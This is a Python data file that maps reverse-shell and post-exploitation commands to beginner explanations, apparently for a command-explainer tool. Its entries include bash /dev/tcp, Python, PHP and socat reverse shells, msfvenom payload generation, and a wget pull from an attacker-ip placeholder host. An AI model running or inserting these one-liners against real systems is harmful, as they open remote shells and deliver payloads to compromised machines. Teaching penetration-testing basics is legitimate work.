"""Pre-authored ELI5 explanations for reverse shell one-liners and
general exploitation commands — the "how do I actually get a shell"
category that gets Googled constantly."""
from __future__ import annotations

ENTRIES: dict[str, str] = {
    "nc -lvnp <port>": (
        "Starts netcat listening for an incoming connection on the "
        "given port. -l means listen, -v is verbose (prints connection "
        "info), -n skips DNS lookups (faster, avoids hangs), -p sets "
        "the port to listen on. This is what you run on your own "
        "attacking machine BEFORE triggering a reverse shell on the "
        "target — the target connects back to you, and this listener "
        "catches that connection and gives you an interactive shell."
    ),
    "bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1": (
        "A classic bash reverse shell one-liner, run ON the target "
        "(after you've already got some form of command execution "
        "there). It opens an interactive bash shell (-i) and redirects "
        "its input/output/error through a TCP connection back to your "
        "listening machine, using bash's built-in /dev/tcp pseudo-device "
        "instead of a separate tool. Only works if the target's bash "
        "was built with this feature enabled (most Linux distros' bash "
        "is, but not all)."
    ),
    "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<attacker-ip>\",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'": (
        "A Python reverse shell one-liner — connects a socket back to "
        "your attacking machine, then redirects the target's standard "
        "input/output/error into that socket (os.dup2) before spawning "
        "an interactive shell. Useful when bash's /dev/tcp trick isn't "
        "available but Python is installed on the target, which is "
        "very common on Linux boxes."
    ),
    "php -r '$sock=fsockopen(\"<attacker-ip>\",<port>);exec(\"/bin/sh -i <&3 >&3 2>&3\");'": (
        "A PHP reverse shell one-liner. Common when your initial "
        "foothold is a web application vulnerability that lets you run "
        "PHP code (like a file upload or an LFI/RFI), since PHP is "
        "already running on the server in that scenario — no need to "
        "drop a separate script, this can go straight into a URL "
        "parameter or webshell."
    ),
    "msfvenom -p <payload> LHOST=<attacker-ip> LPORT=<port> -f <format> -o <output-file>": (
        "msfvenom generates a standalone payload file (rather than a "
        "copy-pasteable one-liner). -p sets the payload type (e.g. "
        "windows/x64/meterpreter/reverse_tcp), LHOST/LPORT are your "
        "listening machine's IP and port for the shell to call back to, "
        "-f sets the output format (exe, elf, php, etc. — whatever the "
        "target can actually run), and -o writes it to a file. This is "
        "the standard way to build a real executable/script payload to "
        "upload and run on a target, rather than pasting a shell "
        "command directly."
    ),
    "rlwrap nc -lvnp <port>": (
        "Same as a normal netcat listener, but wrapped in rlwrap, "
        "which adds command history and proper arrow-key/line-editing "
        "support to the shell you catch. A raw netcat shell can feel "
        "clunky (no history, backspace sometimes misbehaves) — rlwrap "
        "fixes that quality-of-life problem without changing how the "
        "shell itself works."
    ),
    "socat TCP4-LISTEN:<port>,fork EXEC:/bin/bash": (
        "socat is a more powerful, flexible alternative to netcat. This "
        "specific invocation listens for TCP connections and spawns a "
        "bash shell for each one (fork lets it handle multiple "
        "connections). Compared to a basic netcat listener, a socat-"
        "based reverse shell can be made into a full, properly "
        "interactive TTY (with matching commands on both ends), which "
        "matters for running things like sudo or vim that need a real "
        "terminal."
    ),
    "stty raw -echo; fg": (
        "Run on your OWN attacking machine, after already catching a "
        "basic reverse shell, as part of the standard shell-upgrade "
        "process. Together with backgrounding the shell (Ctrl+Z) and "
        "checking 'stty size' beforehand, this makes your local "
        "terminal pass keystrokes through raw (so Ctrl+C and tab-"
        "completion work properly inside the remote shell) instead of "
        "your local shell intercepting them first."
    ),
    "python3 -m http.server <port>": (
        "Starts a quick, no-setup web server in the current directory, "
        "serving files over HTTP on the given port. Extremely common "
        "for transferring tools/payloads to a target — start this on "
        "your attacking machine in the folder containing what you want "
        "to send, then use wget/curl on the target to pull it down."
    ),
    "wget http://<attacker-ip>:<port>/<file> -O /tmp/<file>": (
        "Downloads a file from a URL (commonly your own "
        "python3 -m http.server instance) and saves it to a specific "
        "path with -O. The standard second half of the file-transfer "
        "pattern: serve on your machine, wget/curl on the target."
    ),
    "chmod +x <file>": (
        "Marks a file as executable on Linux. Frequently needed right "
        "after downloading a script or binary onto a target, since "
        "transferred files don't automatically carry execute "
        "permission — without this, trying to run the file just gives "
        "a 'permission denied' error even though the file itself is "
        "fine."
    ),
}
